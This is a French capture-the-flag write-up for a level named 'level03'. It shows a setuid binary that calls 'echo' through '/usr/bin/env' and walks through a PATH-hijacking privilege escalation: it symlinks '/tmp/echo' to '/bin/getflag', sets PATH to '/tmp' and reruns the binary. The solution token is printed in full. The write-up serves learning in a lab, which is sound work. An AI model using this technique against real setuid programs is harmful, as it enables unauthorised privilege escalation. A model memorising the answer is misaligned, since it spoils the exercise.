# Level03

Dans ce niveau, vous êtes confronté à un fichier exécutable nommé "level03". Lorsque vous exécutez ce binaire, vous obtenez le message "Exploit me".
```bash
./level03
Exploit me
```

## Étape 1 : Analyse du fichier exécutable
Tout d'abord, vous pouvez utiliser la commande strings pour analyser le contenu du fichier exécutable "level03". La commande strings extrait les séquences de caractères lisibles à partir d'un fichier binaire. Voici comment vous pouvez l'utiliser :

avec la command strings on peux analyse la fichier

```bash
strings level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
```
Cette commande vous permet de voir les chaînes de caractères contenues dans le binaire. En examinant ces chaînes, vous pouvez repérer des informations utiles.

Dans la sortie de strings, vous pouvez voir une référence à "/usr/bin/env" et des droits "root" sur "echo".


## Étape 2 : Exploitation de la vulnérabilité
Vous pouvez exploiter la vulnérabilité en utilisant un lien symbolique ("symlink") vers un binaire qui vous permet d'exécuter la commande "getflag". Voici comment procéder :
```bash
ln -s /bin/getflag /tmp/echo
```

Cela crée un lien symbolique nommé "echo" dans le répertoire "/tmp" qui pointe vers "/bin/getflag".

Modifiez la variable d'environnement "PATH" pour inclure le répertoire "/tmp", afin que le binaire "echo" soit prioritaire sur le binaire système "echo". Vous pouvez le faire avec la commande ```export```:
```bash
export PATH=/tmp
```
Exécutez à nouveau le binaire "level03" :

```bash
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
En exécutant le binaire "level03" avec cette configuration, il appellera maintenant votre binaire "echo" (qui est en réalité un lien symbolique vers "getflag") au lieu de l'outil système "echo". Cela permettra d'exécuter la commande "getflag" et d'obtenir le jeton pour passer au niveau suivant.

